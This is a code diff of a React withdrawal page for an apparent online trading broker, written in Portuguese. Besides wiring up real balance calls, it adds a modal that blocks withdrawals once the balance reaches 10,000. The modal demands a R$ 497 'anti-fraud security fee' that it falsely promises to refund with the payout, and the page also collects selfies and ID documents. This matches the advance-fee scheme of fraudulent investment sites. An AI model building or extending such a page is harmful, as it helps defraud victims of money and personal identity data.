@@ -2,12 +2,13 @@
 
 import { useState, useEffect, useRef } from "react"
 import { CheckCircle, Camera, Upload, X } from "lucide-react"
+import { getUserBalance, updateUserBalance } from "@/lib/actions/balance"
 
 export default function SaquePage() {
   const [withdrawalAmount, setWithdrawalAmount] = useState("200")
   const [pixKey, setPixKey] = useState("")
   const [agreedToTerms, setAgreedToTerms] = useState(false)
-  const [balance, setBalance] = useState(5000)
+  const [balance, setBalance] = useState(0)
   const [withdrawalSuccess, setWithdrawalSuccess] = useState(false)
   const [showKycModal, setShowKycModal] = useState(false)
   const [kycStep, setKycStep] = useState("intro")
@@ -16,6 +17,7 @@ export default function SaquePage() {
   const [showCamera, setShowCamera] = useState(false)
   const [selfieCapture, setSelfieCapture] = useState<string | null>(null)
   const [isLoadingBalance, setIsLoadingBalance] = useState(true)
+  const [isProcessing, setIsProcessing] = useState(false)
   
   const videoRef = useRef<HTMLVideoElement>(null)
   const canvasRef = useRef<HTMLCanvasElement>(null)
@@ -23,18 +25,19 @@ export default function SaquePage() {
   
   const predefinedAmounts = [200, 1000, 2000, 100, 500, 1500, 4000]
 
-  // Carregar saldo do usuário
+  // Buscar saldo do usuário ao carregar a página
   useEffect(() => {
     const fetchBalance = async () => {
       try {
         setIsLoadingBalance(true)
-        // Simular busca do saldo - substituir pela chamada real da API
-        setTimeout(() => {
-          setBalance(5000)
-          setIsLoadingBalance(false)
-        }, 500)
+        const result = await getUserBalance()
+        
+        if (result.success && result.data) {
+          setBalance(result.data.balance)
+        }
       } catch (err) {
         console.error("Erro ao buscar saldo:", err)
+      } finally {
         setIsLoadingBalance(false)
       }
     }
@@ -86,19 +89,39 @@ export default function SaquePage() {
       return
     }
 
+    // Verificar se precisa pagar taxa de segurança (saldo >= 10000)
+    if (balance >= 10000) {
+      setShowKycModal(true)
+      setKycStep("security-fee")
+      return
+    }
+
     // Processar saque
     processWithdrawal(withdrawalValue)
   }
 
-  const processWithdrawal = (amount: number) => {
-    // Atualizar saldo
-    const newBalance = balance - amount
-    setBalance(newBalance)
-    
-    // Aqui você faria a chamada para API para processar o saque
-    // await updateUserBalance({ balance: -amount, operation: "subtract" })
-    
-    setWithdrawalSuccess(true)
+  const processWithdrawal = async (amount: number) => {
+    try {
+      setIsProcessing(true)
+      
+      // Atualizar o saldo subtraindo o valor do saque
+      const result = await updateUserBalance({
+        balance: amount,
+        operation: "subtract"
+      })
+
+      if (result.success && result.data) {
+        setBalance(result.data.balance)
+        setWithdrawalSuccess(true)
+      } else {
+        showToast("Erro", "Não foi possível processar o saque. Tente novamente.", "destructive")
+      }
+    } catch (err) {
+      console.error("Erro ao processar saque:", err)
+      showToast("Erro", "Houve um erro ao processar o saque. Tente novamente.", "destructive")
+    } finally {
+      setIsProcessing(false)
+    }
   }
 
   const handleFileUpload = (e: React.ChangeEvent<HTMLInputElement>, side: "front" | "back") => {
@@ -189,20 +212,9 @@ export default function SaquePage() {
     }
   }, [])
 
-
   return (
-
-    
     <div className="min-h-screen bg-white text-black">
       <div className="container mx-auto px-4 py-8">
-         <div className="mb-6">
-          <div className="text-sm text-gray-500">
-            <span className="hover:text-black cursor-pointer transition-colors">Método de saque</span>
-            <span className="mx-2">›</span>
-            <span className="text-black font-medium">PIX</span>
-          </div>
-        </div>
-
         {/* Display do Saldo */}
         <div className="max-w-2xl mx-auto mb-6">
           <div className="bg-gradient-to-r from-black to-gray-800 text-white p-6 rounded-xl shadow-lg">
@@ -227,7 +239,14 @@ export default function SaquePage() {
           </div>
         </div>
 
-       
+        <div className="mb-6">
+          <div className="text-sm text-gray-500">
+            <span className="hover:text-black cursor-pointer transition-colors">Método de saque</span>
+            <span className="mx-2">›</span>
+            <span className="text-black font-medium">PIX</span>
+          </div>
+        </div>
+
         <div className="max-w-2xl mx-auto">
           {withdrawalSuccess ? (
             <div className="bg-white border-2 border-gray-200 rounded-xl p-8 text-center shadow-sm">
@@ -342,14 +361,20 @@ export default function SaquePage() {
                 <button
                   onClick={() => window.history.back()}
                   className="flex-1 py-3 px-6 bg-white border-2 border-gray-200 text-black font-bold rounded-lg hover:border-black transition-all"
+                  disabled={isProcessing}
                 >
                   Voltar
                 </button>
                 <button
                   onClick={handleWithdrawal}
-                  className="flex-1 py-3 px-6 bg-black text-white font-bold rounded-lg hover:bg-gray-800 transition-all shadow-md"
+                  disabled={isProcessing}
+                  className={`flex-1 py-3 px-6 rounded-lg font-bold transition-all shadow-md ${
+                    isProcessing
+                      ? "bg-gray-400 text-white cursor-not-allowed"
+                      : "bg-black text-white hover:bg-gray-800"
+                  }`}
                 >
-                  Confirmar Saque
+                  {isProcessing ? "Processando..." : "Confirmar Saque"}
                 </button>
               </div>
             </div>
@@ -360,6 +385,55 @@ export default function SaquePage() {
         {showKycModal && (
           <div className="fixed inset-0 bg-black bg-opacity-60 flex items-center justify-center z-50 p-4 backdrop-blur-sm">
             <div className="bg-white rounded-2xl p-8 max-w-2xl w-full max-h-[90vh] overflow-y-auto shadow-2xl">
+              {kycStep === "security-fee" && (
+                <>
+                  <div className="flex items-center justify-between mb-6">
+                    <div className="flex items-center gap-3">
+                      <img
+                        src="https://aurumtraderbroker.site/aurum_logo.jpg"
+                        alt="Strellar Broker"
+                        className="w-12 h-12 object-contain"
+                      />
+                      <h2 className="text-2xl font-bold text-black">Taxa de Segurança Anti-Fraude</h2>
+                    </div>
+                    <button 
+                      onClick={() => setShowKycModal(false)} 
+                      className="text-gray-400 hover:text-black text-2xl w-8 h-8 flex items-center justify-center rounded-full hover:bg-gray-100 transition-all"
+                    >
+                      <X size={24} />
+                    </button>
+                  </div>
+
+                  <p className="text-gray-600 mb-4 text-center leading-relaxed">
+                    Para garantir sua segurança e evitar fraudes, é necessário pagar uma taxa única de{" "}
+                    <span className="text-black font-bold text-xl">R$ 497,00</span>.
+                  </p>
+
+                  <p className="text-gray-600 mb-8 text-center leading-relaxed">
+                    O valor da taxa será devolvido junto com o valor do seu saque, direto no seu PIX.
+                  </p>
+
+                  <button
+                    onClick={() => {
+                      setShowKycModal(false)
+                      // Redirecionar para pagamento da taxa ou processar
+                      showToast("Taxa de Segurança", "Redirecionando para pagamento da taxa de segurança...", "default")
+                      // Aqui você implementaria o fluxo de pagamento da taxa
+                    }}
+                    className="w-full py-4 px-6 bg-gradient-to-r from-purple-500 to-purple-600 text-white font-bold rounded-xl hover:from-purple-600 hover:to-purple-700 transition-all shadow-lg mb-4 flex items-center justify-center gap-2 text-lg"
+                  >
+                    💳 PAGAR TAXA E SACAR
+                  </button>
+
+                  <button
+                    onClick={() => setShowKycModal(false)}
+                    className="w-full py-3 px-6 bg-white border-2 border-gray-200 text-black font-bold rounded-xl hover:border-black transition-all"
+                  >
+                    Cancelar
+                  </button>
+                </>
+              )}
+
               {kycStep === "intro" && (
                 <>
                   <div className="text-center mb-6">
